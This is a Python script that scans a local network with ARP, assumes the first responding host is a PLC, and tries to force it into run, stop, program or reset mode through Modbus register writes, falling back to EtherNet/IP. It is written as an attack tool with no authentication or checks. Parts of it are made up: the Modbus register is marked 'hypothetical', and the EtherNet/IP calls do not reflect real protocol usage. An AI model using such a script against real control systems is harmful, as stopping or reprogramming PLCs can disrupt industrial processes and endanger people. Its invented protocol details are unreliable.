import sys
import time
from scapy.all import ARP, Ether, srp
from pyModbusTCP.client import ModbusClient
from ethernetip.cip import CIP, ConnectionManager, Services
from ethernetip import EtherNetIP


def find_plc_ip(network="192.168.1.0/24"):
    """Scan the network to find the PLC's IP address."""
    print("[*] Scanning network for PLC devices...")

    # ARP Request packet
    arp_request = ARP(pdst=network)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request

    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    # Look for possible PLC addresses (filter by manufacturer if needed)
    possible_plcs = []
    for sent, received in answered_list:
        print(f"[+] Found device: {received.psrc} ({received.hwsrc})")
        possible_plcs.append(received.psrc)

    if not possible_plcs:
        print("[!] No PLCs found on the network.")
        sys.exit(1)

    return possible_plcs[0]  # Return the first probable PLC (manual refinement needed)


def change_plc_mode_modbus(plc_ip, mode):
    """Changes the PLC operating mode using Modbus."""
    print(f"[*] Connecting to PLC at {plc_ip} via Modbus TCP...")

    modbus_client = ModbusClient(host=plc_ip, port=502, auto_open=True)

    if not modbus_client.open():
        print("[!] Failed to connect to PLC via Modbus.")
        return
    
    mode_mapping = {
        "run": 1,
        "stop": 2,
        "program": 3,
        "reset": 4
    }

    if mode not in mode_mapping:
        print("[!] Invalid mode specified.")
        return

    register_address = 0x0001  # Hypothetical Modbus register for mode selection
    mode_value = mode_mapping[mode]

    write_success = modbus_client.write_single_register(register_address, mode_value)
    
    if write_success:
        print(f"[+] Successfully changed PLC operating mode to {mode.upper()}.")
    else:
        print("[!] Failed to change operating mode.")

    modbus_client.close()


def change_plc_mode_ethernet_ip(plc_ip, mode):
    """Changes the PLC operating mode using EtherNet/IP (Common Industrial Protocol)."""
    print(f"[*] Connecting to PLC at {plc_ip} via EtherNet/IP...")

    mode_mapping = {
        "run": 0x06,
        "stop": 0x07,
        "program": 0x08,
        "reset": 0x09
    }

    if mode not in mode_mapping:
        print("[!] Invalid mode specified.")
        return

    plc = EtherNetIP(plc_ip)
    plc.connect()

    cm = ConnectionManager(plc)
    service = Services.set_attribute_single(mode_mapping[mode])

    response = plc.send(service)

    if response:
        print(f"[+] Successfully changed PLC operating mode to {mode.upper()}.")
    else:
        print("[!] Failed to change operating mode.")

    plc.disconnect()


if __name__ == "__main__":
    plc_ip = find_plc_ip()

    print(f"[*] PLC detected at {plc_ip}. Attempting to change operating mode...")

    target_mode = "program"  # Change the mode as needed (e.g., run, stop, program, reset)

    try:
        change_plc_mode_modbus(plc_ip, target_mode)  # Modbus method
    except Exception:
        print("[!] Modbus method failed, trying EtherNet/IP...")
        change_plc_mode_ethernet_ip(plc_ip, target_mode)